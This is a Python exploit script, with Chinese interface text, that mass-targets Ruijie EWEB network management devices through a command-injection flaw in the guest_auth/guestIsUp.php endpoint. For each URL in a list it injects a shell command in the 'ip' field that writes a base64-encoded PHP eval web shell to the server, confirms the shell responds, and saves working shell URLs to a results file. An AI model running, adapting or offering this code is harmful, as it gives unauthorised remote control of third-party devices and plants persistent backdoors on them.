import requests
import sys
import urllib3
import random
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def header():
    print('*-----------------------------------------*')
    print('!  \033[36mdescription:锐捷网络EWEB网管系统RCE    \033[0m')
    print('!  \033[36m使用格式: python3 gateway.py urls.txt    \033[0m')
    print('*-----------------------------------------*')

def Detect(targets):
    header= {
        "Content-Type":"application/x-www-form-urlencoded; charset=UTF-8",
        "user-agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.3538.77 Safari/537.36"
    }
    shell = "PD9waHAgQGV2YWwoJF9QT1NUWzFdKTs/Pg=="
    shellname = str(random.randrange(8888,9999))+'.php'
    data = 'ip=127.0.0.1|echo "'+shell+'"|base64 -d > '+shellname+'&mac=00-00' 
    with open(targets) as fp:
        k=0
        for target in fp.readlines():
            vuln_url = target.strip() + "/guest_auth/guestIsUp.php"
            shellurl = target.strip() + '/guest_auth/'+shellname
            print("\033[32m正在检测:{}\033[0m".format(vuln_url))
            try:
                response = requests.post(vuln_url,data = data,headers = header,verify = False,timeout = 10)
                if response.status_code == 200:
                    try:
                        r=requests.get(shellurl,headers = header,verify = False,timeout = 5)
                        if(r.status_code==200):
                            print("\033[31m{}存在漏洞！！！\033[0m".format(vuln_url))
                            k=k+1
                            with open("result.txt","a+") as wp:
                                wp.write(shellurl+"\n")
                        else:
                            print("\033[32m未检测到该漏洞存在！！！ \033[0m")
                    except:
                        print("\033[32m{}访问失败！！！ \033[0m".format(vuln_url))
                else:
                    print("\033[32m未检测到该漏洞存在！！！ \033[0m")
            except:
                print("\033[32m{}访问失败！！！ \033[0m".format(vuln_url))
        print("共检测URL地址{}个".format(len(fp.readlines())))
        print("可成功getshell的地址共{}个,结果已保存到当前目录下的vuln.txt!!!".format(k))
        fp.close()
if __name__ == "__main__":
    header()
    if(len(sys.argv)==2):
        targets = sys.argv[1]
        Detect(targets)
    else:
        print("usage: python3 gateway.py urls.txt")